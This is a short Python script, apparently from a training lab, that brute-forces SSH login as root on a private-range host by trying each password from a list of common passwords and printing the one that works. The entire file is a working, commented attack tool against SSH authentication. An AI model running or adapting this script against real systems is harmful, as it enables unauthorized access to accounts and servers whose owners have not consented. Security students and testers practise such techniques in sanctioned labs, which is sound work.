from pwn import *
import paramiko

host = "10.10.169.65"  # Target host IP address
username = "root"  # Hostname that we want to bruteforce
attempts = 0  # Counter for keeping track of attempts

with open("top-20-common-SSH-passwords.txt", "r") as passwords_list:
    # Open the file containing the list of passwords
    for password in passwords_list:
        password = password.strip("\n")  # Remove newline character from each password
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            # Attempt SSH connection using the current password
            response = ssh(host=host, user=username, password=password, timeout=2)
            
            if response.connected():
                # If the connection is successful, print the valid password and break the loop
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break

            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            # If authentication fails, print "Invalid password!"
            print("Invalid password!")

        attempts += 1  # Increment the attempts counter for each password
